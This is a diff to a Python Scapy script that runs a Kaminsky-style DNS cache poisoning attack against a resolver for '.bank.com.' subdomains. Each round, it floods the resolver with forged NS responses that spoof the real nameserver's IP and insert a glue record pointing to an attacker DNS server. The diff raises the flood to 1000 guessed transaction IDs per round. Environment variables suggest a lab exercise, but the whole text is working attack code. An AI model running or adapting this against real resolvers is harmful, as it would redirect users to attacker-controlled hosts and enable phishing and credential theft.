@@ -13,7 +13,8 @@ target_dns_port_in = int(os.environ['VLN_DNS_PORT_IN'])
 target_dns_port_out = int(os.environ['VLN_DNS_PORT_OUT'])
 
 # Target domain base to be messed with
-target_domain_base = ".bank.com"
+target_domain_base = ".bank.com."
+target_ns = "bank.com."
 # Authoritative NS for the target domain
 known_ns_domain = "ns01.cashparking.com."
 known_ns_ip = "216.69.185.38"
@@ -23,8 +24,8 @@ attacker_dns_ip = os.environ['ATK_SERVER_IP']
 expected_ip = os.environ['ATK_FORGED_IP']
 
 
-def initial_request(domain, ip, port):
-    return Ether() / IP(dst=ip) / UDP(dport=port) / DNS(
+def initial_request(domain):
+    return Ether() / IP(dst=target_dns_ip) / UDP(dport=target_dns_port_in) / DNS(
         id=42,
         qr=0,
         rd=1,
@@ -37,8 +38,8 @@ def initial_request(domain, ip, port):
     )
 
 
-def forged_ns_response(id, target_domain, target_ip, attacker_dns_ip, known_ns_domain, known_ns_ip, dst_port):
-    response = Ether() / IP(src=known_ns_ip, dst=target_ip) / UDP(dport=dst_port) / DNS(
+def forged_ns_response(id, target_domain):
+    response = Ether() / IP(src=known_ns_ip, dst=target_dns_ip) / UDP(dport=target_dns_port_out) / DNS(
         id=id,  # Query ID / transaction id
         qr=1,  # QR (Query / Response) 1=response
         opcode=0,  # Set by client to 0 for a standard query, 0:"QUERY",1:"IQUERY",2:"STATUS"
@@ -61,30 +62,29 @@ def forged_ns_response(id, target_domain, target_ip, attacker_dns_ip, known_ns_d
         qd=DNSQR(qname=target_domain, qtype='A', qclass='IN'),
         # DNS Resource Record
         an=0,
-        ns=DNSRR(rrname=target_domain, type='NS', rdata=known_ns_domain, ttl=253643),
-        ar=DNSRR(rrname=known_ns_domain, type='A', rdata=attacker_dns_ip, ttl=253643)
+        ns=DNSRR(rrname=target_ns, type='NS', rdata=known_ns_domain, ttl=3600),
+        ar=DNSRR(rrname=known_ns_domain, type='A', rdata=attacker_dns_ip, ttl=3600)
     )
     return response
 
 
 counter = 0
 while True:
-    target_domain = "www" + str(counter) + target_domain_base
+    target_domain = "www{}{}".format(counter, target_domain_base)
     counter = (counter + 1) % (2 ** 16)
 
-    packet_list = [initial_request(target_domain, target_dns_ip, target_dns_port_in)]
+    packet_list = [initial_request(target_domain)]
 
-    response_amount = 50
+    response_amount = 1000
     r = random.randint(0, (2 ** 16) - response_amount + 1)
     for i in range(r, r + response_amount):
         packet_list.append(
-            forged_ns_response(i, target_domain, target_dns_ip, attacker_dns_ip, known_ns_domain, known_ns_ip,
-                               target_dns_port_out))
+            forged_ns_response(i, target_domain))
 
     p_txid_match = (1 / (2 ** 16)) * response_amount * counter * 100
     print("Iteration: {}, possible cache poisoning: {:4.2f}%".format(counter, p_txid_match))
     print("Sending packets from {} with id in interval [{}, {}] to {}".format(known_ns_ip, r, r + response_amount,
-                                                                              target_domain))
+                                                                              target_dns_ip))
 
     sendpfast(packet_list, pps=100000, iface="eth1", verbose=0)
 
@@ -98,5 +98,3 @@ while True:
             print("Poisoning failed")
     except:
         print("Poisoning failed")
-
-
